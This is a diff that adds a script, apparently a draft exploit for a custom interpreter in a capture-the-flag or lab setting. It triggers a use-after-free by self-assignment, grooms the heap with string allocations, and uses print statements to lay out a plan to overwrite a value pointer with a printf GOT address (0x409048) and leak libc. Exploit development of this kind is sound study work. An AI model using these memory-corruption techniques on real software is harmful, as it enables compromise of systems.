@@ -1,0 +1,39 @@
+print("=== Use-After-Free Direct Corruption ===");
+
+print("Step 1: Create target variable");
+string target = "target";
+print("Target created");
+
+print("Step 2: Create use-after-free");
+target = target;
+print("target.value_ptr now points to freed memory");
+
+print("Step 3: Heap grooming - allocate strings");
+print("Goal: Make target.value_ptr point to another variable's entry");
+string groom1 = "groom1";
+string groom2 = "groom2";
+string groom3 = "groom3";
+string groom4 = "groom4";
+string groom5 = "groom5";
+print("Created grooming strings");
+
+print("Step 4: Check if target points to variable entry");
+print("If target.value_ptr points to a variable entry:");
+print("  - We can read/write that entry");
+print("  - Corrupt its value_ptr to printf@GOT");
+print("  - Read libc address");
+
+print("Step 5: Try to read from target");
+print("If target points to variable entry, reading it might:");
+print("  - Return the variable's value");
+print("  - Or cause type confusion");
+print("  - Or give us the entry address");
+
+print("Step 6: If we can write through target");
+print("We can directly corrupt the variable entry's value_ptr");
+print("Set it to printf@GOT (0x409048)");
+print("Then read libc address");
+
+print("Note: This approach avoids bitmap overflow coordinate issues");
+print("Uses use-after-free to directly access variable table");
+
